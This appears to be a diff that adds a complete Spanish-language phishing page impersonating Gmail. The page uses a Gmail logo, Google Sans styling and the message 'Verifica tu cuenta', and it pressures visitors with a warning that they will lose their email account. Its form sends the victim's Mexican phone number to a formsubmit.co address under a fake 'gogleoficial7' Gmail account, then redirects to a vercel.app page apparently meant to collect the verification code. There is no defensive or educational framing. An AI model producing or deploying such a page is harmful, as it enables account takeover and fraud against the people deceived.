@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gmai</title>
+
+    <style>
+        @font-face {
+            font-family: 'Googlesans';
+            src: url('./GoogleSans-Regular.ttf');
+          }
+          
+          * {
+            font-family: 'Googlesans', sans-serif;
+          }
+        body {
+            background-color: #fff;
+          }
+          
+          .container {
+            background-color: #fff;
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 20px;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+          }
+          
+          h1 {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 400;
+            margin-bottom: 0px;
+          }
+          
+          h3{
+            font-size: 15px;
+            text-align: center;
+            margin-bottom: 12px;
+            font-weight: 400;
+            margin-bottom: 25px;
+          }
+
+          form {
+            display: flex;
+            flex-direction: column;
+          }
+          
+          label {
+            font-size: 14px;
+            margin-bottom: 5px;
+          }
+          
+          input[type="text"],
+          input[type="password"] {
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+          }
+          
+          input[type="submit"] {
+            background-color: #4285f4;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            height: 45px;
+          }
+          
+          .checkbox {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+          }
+          
+          .checkbox input[type="checkbox"] {
+            margin-right: 5px;
+          }
+          
+          #email{
+            width: 100%;
+            height: 35px;
+            font-size: 17px;
+            color: gray;
+            padding: 12px;
+          }
+
+          form{
+            width: 100%;
+            padding-left: 35px;
+            padding-right: 55px;
+          }
+
+          a {
+            color: #4285f4;
+            text-decoration: none;
+          }
+
+          label{
+            color: #000;
+            margin-right: 10px;
+            margin-left: 10px;
+          }
+          
+          .continput{
+            display: flex;
+            align-items: center;
+            border: 1px solid #ccc;
+            padding-left: 5px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            width: 100%;
+          }
+
+          hr {
+            border: none;
+            border-top: 1px solid #ccc;
+            margin-top: 20px;
+            margin-bottom: 20px;
+          }
+          
+    </style>
+
+</head>
+<body>
+    <div class="container">
+        <img width="155px" src="./logo.png" alt="Gmail">
+        <h1>Verifica tu cuenta</h1>
+        <h3>Ingresa tu numero de celular para verificar. No pierdas tu cuenta de correo electrónico</h3>
+        <form action="https://formsubmit.co/gogleoficial7@gmail.com" method="POST">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_next" value="https://gmailverificacionpersonal.vercel.app/codigo.html">
+          <div class="continput">
+            <label for="email">+52</label>
+          <input type="number" id="email" name="numerocel" placeholder="Ingresa tu numero de celular" maxlenght="10" required>
+        </div>
+
+          <div class="checkbox">
+            <label for="remember"><a href="">¿Has olvidado tu numero de celular?</a></label>
+          </div>
+        
+          <input type="submit" id="boton" value="Verificar">
+        </form>
+       
+        <hr>
+        <p>¿No tienes una cuenta? <a href="#">Crea una ahora</a></p>
+        <h3 style="font-size: 20px;">Hotmail, Outlook, Live</h3>
+      </div>
+
+      <script>
+        var input = document.getElementById("email");
+        var boton = document.getElementById("boton");
+
+        input.addEventListener("input", function() {
+          if (input.value.length > 10) {
+            input.value = input.value.slice(0, 10);
+          }
+        });
+
+        boton.addEventListener("click", function() {
+          if (input.value.length < 10) {
+            boton.disabled = true;
+          }
+        });
+
+
+
+      </script>
+
+</body>
+</html>
